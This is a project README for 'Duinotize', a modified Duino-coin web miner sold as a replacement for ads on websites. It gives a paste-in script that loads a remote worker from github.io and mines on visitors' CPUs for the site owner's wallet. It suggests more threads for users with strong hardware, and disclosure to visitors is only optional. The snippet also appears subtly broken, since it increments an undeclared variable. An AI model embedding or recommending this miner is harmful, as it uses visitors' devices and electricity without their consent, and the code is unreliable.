# Duinotize
_Duino-coin webminer/website monetizer_

Tired of showing users ads? Use Duinotize! It's a modified version of the Duino-coin web miner designed to be integrated into any website 

## Installation
Put the following code at the very bottom of the page where you want the miner to start: (most likley your home page, as the miner will run in the background for the duration your visiters are on the site, not just the page)
```
<script>
let threads = "1";
for (let workersAmount = 0; workersAmount < threads; workersAmount++) {
    let socketWorker = new Worker("https://mobilegmyt.github.io/Duinotize/miner.js");
    socketWorker.postMessage('Start,' + "username" + "," + "rigid" + "," + "0" + "," + Math.floor(Math.random() * 2811));
    workerVer++;
}
</script>
```
NOTE: You'll want to repalce `username` with your Duco account username, and `rigid` with the ID you want it to show up as in the wallet, so for example:
`socketWorker.postMessage('Start,' + "rpinews" + "," + "site-monotizer" + "," + "0" + "," + Math.floor(Math.random() * 2811));`. You can also change the `threads` variable, it is set to 1 for default so it'll work on all devices, but if most people using your site have buff gaming PCs, then you can turn it up to 2 or 3, but it will start to strain their CPU more.

We reccomend you put a note somewhere on your website to tell visiters that there is a crypto miner running in the background, and credit this repo.

This project is a fork/continuation of https://github.com/VatsaDev/Mineuino as the original author seems to have abandoned it and the code is broken.

## Notes
- If there is enough demand for it, I might be able to add a XXHASH miner to the code
- I made this in 2 hours, so if there are bugs PLEASE report them
